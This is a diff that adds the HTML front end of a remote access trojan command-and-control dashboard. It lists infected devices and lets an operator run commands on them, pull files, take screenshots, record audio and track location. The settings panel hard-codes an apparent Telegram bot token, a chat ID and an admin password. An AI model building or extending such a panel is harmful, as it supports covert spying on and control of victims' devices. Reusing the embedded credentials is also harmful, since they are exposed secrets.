@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>RAT C2 Dashboard</title>
+ <link rel="stylesheet" href="style.css">
+</head>
+<body>
+ <div class="container">
+ <header>
+ <h1>RAT C2 Dashboard</h1>
+ <div class="stats">
+ <div class="stat">
+ <span class="stat-value" id="total-devices">0</span>
+ <span class="stat-label">Total Devices</span>
+ </div>
+ <div class="stat">
+ <span class="stat-value" id="active-devices">0</span>
+ <span class="stat-label">Active Devices</span>
+ </div>
+ <div class="stat">
+ <span class="stat-value" id="total-files">0</span>
+ <span class="stat-label">Total Files</span>
+ </div>
+ </div>
+ </header>
+
+ <div class="tabs">
+ <button class="tab-button active" onclick="openTab('devices')">Devices</button>
+ <button class="tab-button" onclick="openTab('commands')">Commands</button>
+ <button class="tab-button" onclick="openTab('logs')">Logs</button>
+ <button class="tab-button" onclick="openTab('settings')">Settings</button>
+ </div>
+
+ <div id="devices" class="tab-content">
+ <div class="search-box">
+ <input type="text" id="device-search" placeholder="Search devices..." onkeyup="searchDevices()">
+ </div>
+ <table id="devices-table">
+ <thead>
+ <tr>
+ <th>UUID</th>
+ <th>IP Address</th>
+ <th>OS</th>
+ <th>Last Seen</th>
+ <th>Status</th>
+ <th>Actions</th>
+ </tr>
+ </thead>
+ <tbody id="devices-list">
+ <!-- Devices will be loaded here -->
+ </tbody>
+ </table>
+ </div>
+
+ <div id="commands" class="tab-content" style="display: none;">
+ <div class="command-panel">
+ <h2>Send Command</h2>
+ <div class="command-form">
+ <select id="command-device">
+ <option value="">Select Device</option>
+ </select>
+ <select id="command-type">
+ <option value="exec">Execute Command</option>
+ <option value="download">Download File</option>
+ <option value="screenshot">Take Screenshot</option>
+ <option value="record">Record Audio</option>
+ <option value="location">Get Location</option>
+ </select>
+ <input type="text" id="command-input" placeholder="Command or file path">
+ <button onclick="sendCommand()">Send Command</button>
+ </div>
+ </div>
+ <div class="command-results">
+ <h2>Command Results</h2>
+ <table id="commands-table">
+ <thead>
+ <tr>
+ <th>Device</th>
+ <th>Command</th>
+ <th>Status</th>
+ <th>Result</th>
+ <th>Time</th>
+ </tr>
+ </thead>
+ <tbody id="commands-list">
+ <!-- Commands will be loaded here -->
+ </tbody>
+ </table>
+ </div>
+ </div>
+
+ <div id="logs" class="tab-content" style="display: none;">
+ <div class="log-filters">
+ <select id="log-level">
+ <option value="all">All Levels</option>
+ <option value="info">Info</option>
+ <option value="warn">Warning</option>
+ <option value="error">Error</option>
+ </select>
+ <input type="text" id="log-search" placeholder="Search logs..." onkeyup="searchLogs()">
+ </div>
+ <div class="log-container">
+ <pre id="log-content">Loading logs...</pre>
+ </div>
+ </div>
+
+ <div id="settings" class="tab-content" style="display: none;">
+ <div class="settings-panel">
+ <h2>Server Settings</h2>
+ <div class="setting">
+ <label for="telegram-token">Telegram Bot Token:</label>
+ <input type="text" id="telegram-token" value="7561698582:AAFhMEKlCgKx136YBZ-p_f4Glg-cpzsQsyQ">
+ </div>
+ <div class="setting">
+ <label for="telegram-chat">Telegram Chat ID:</label>
+ <input type="text" id="telegram-chat" value="6837315281">
+ </div>
+ <div class="setting">
+ <label for="admin-username">Admin Username:</label>
+ <input type="text" id="admin-username" value="admin">
+ </div>
+ <div class="setting">
+ <label for="admin-password">Admin Password:</label>
+ <input type="password" id="admin-password" value="SuperSecretPassword123!">
+ </div>
+ <button onclick="saveSettings()">Save Settings</button>
+ </div>
+ </div>
+ </div>
+
+ <script src="dashboard.js"></script>
+</body>
+</html>
